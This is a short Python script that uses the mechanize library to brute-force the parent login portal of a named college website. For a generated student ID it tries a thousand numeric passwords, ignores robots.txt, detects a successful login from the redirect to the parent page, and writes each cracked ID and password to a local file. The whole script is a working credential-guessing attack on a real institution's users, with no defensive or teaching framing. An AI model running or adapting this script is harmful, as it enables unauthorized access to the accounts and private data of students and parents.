__author__ = 'T90'
__version__ = '1.0.0'

import mechanize


def file(id, pass1):
	f = open("rsetpass.txt", "a")
	line = id + ", " + pass1 + "\n"
	f.write(line)
	f.close()


def getdata():
	prev = 0
	startpass = 2000
	startid = 3114
	for i in xrange(startid, startid + 1):#00):
		id = "U110" + str(i)
		for j in xrange(startpass, startpass + 1000):
			browser = mechanize.Browser(factory=mechanize.RobustFactory())
			browser.set_handle_robots(False)
			r = browser.open("http://rajagiritech.ac.in/stud/parent/")
			browser.select_form(nr=0)
			passw = str(j)
			browser.form["user"] = id
			browser.form["pass"] = passw
			browser.submit()
			if 'Parent.asp' in str(browser.geturl()):
				print id, passw
				file(id, passw)
				prev = j - startpass if prev == 0 else prev + 1
				break

getdata()